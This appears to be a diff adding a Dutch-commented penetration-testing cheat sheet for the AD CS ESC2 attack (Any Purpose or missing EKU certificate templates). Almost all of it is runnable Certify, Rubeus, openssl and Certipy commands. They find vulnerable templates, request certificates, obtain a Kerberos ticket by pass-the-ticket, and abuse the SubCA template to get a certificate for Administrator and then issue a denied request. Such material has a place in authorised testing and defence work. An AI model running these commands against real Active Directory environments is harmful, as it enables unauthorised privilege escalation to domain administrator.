@@ -1,0 +1,24 @@
+# AD CS ESC2 - Any Purpose EKU / No EKU
+# Template heeft "Any Purpose" EKU of helemaal geen EKU (SubCA)
+# Hiermee kan het certificaat voor elk doel gebruikt worden, inclusief client auth
+# Stap 1: Vind templates met Any Purpose of geen EKU
+.\Certify.exe find /vulnerable
+# Zoek naar: pkiextendedkeyusage: Any Purpose (2.5.29.37.0)
+# Of: pkiextendedkeyusage: <geen waarde>
+# Stap 2: Certificaat aanvragen
+.\Certify.exe request /ca:dc01.domain.local\domain-CA /template:"TemplateName"
+# Stap 3: Convert cert.pem naar .pfx
+# openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out esc2.pfx
+# Stap 4: TGT aanvragen met certificaat
+.\Rubeus.exe asktgt /user:CurrentUser /certificate:esc2.pfx /password:CertPassword /ptt
+# Via Certipy (Linux):
+certipy req -u user@domain.local -p Password123! -ca domain-CA -target dc01.domain.local -template TemplateName
+certipy auth -pfx user.pfx -dc-ip DC_IP
+# SubCA template variant (geen EKU):
+# Als request wordt denied, gebruik Certipy om de denied request te recoveren:
+certipy req -u user@domain.local -p Password123! -ca domain-CA -target dc01.domain.local -template SubCA -upn Administrator@domain.local
+# Bij denied: noteer request ID
+certipy ca -ca domain-CA -issue-request REQUEST_ID -u admin@domain.local -p Password123!
+certipy req -u user@domain.local -p Password123! -ca domain-CA -target dc01.domain.local -retrieve REQUEST_ID
+# Tip: SubCA template is standaard alleen beschikbaar voor Domain/Enterprise Admins
+# Tip: "Any Purpose" is gevaarlijker dan het klinkt — het omvat client authentication
